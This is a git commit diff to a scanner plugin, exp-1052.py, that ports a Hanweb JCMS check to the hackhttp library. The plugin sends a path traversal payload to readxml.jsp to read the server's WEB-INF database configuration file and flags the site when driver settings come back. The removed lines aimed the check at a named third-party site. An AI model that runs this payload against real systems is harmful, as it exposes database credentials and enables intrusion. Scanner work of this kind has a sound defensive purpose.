e7d4f4f97eb022446db5ce363b48c10ec5151ba5
Charaysen <59277612+Charaysen@users.noreply.github.com>
2021-01-16 14:12:52 +0800

    Update exp-1052.py

--- bugscan/exp-1052.py
+++ bugscan/exp-1052.py
@@ -7,19 +7,12 @@ Author  :  kenan
 mail    :  2863482451@qq.com
 Referer :http://www.wooyun.org/bugs/wooyun-2013-046837
 '''
-def assign(service, arg):
-    if service == "hanweb":
-        return True, arg
-
-
-def audit(arg):
+import hackhttp
+def run(arg):
      
     payload = "jcms/workflow/design/readxml.jsp?flowcode=../../../WEB-INF/config/dbconfig"
     url = arg + payload
-    code, head, res, errcode, _ = curl.curl(url)
+    hh = hackhttp.hackhttp()
+    code, head, res, errcode, _ = hh.http(url)
     if code == 200 and '<driver-class>' in res and '<driver-properties>' in res:
         security_hole(url)
-
-if __name__ == '__main__':
-    from dummy import *
-    audit(assign('hanweb', 'http://shop.taikang.com/invest/')[1])
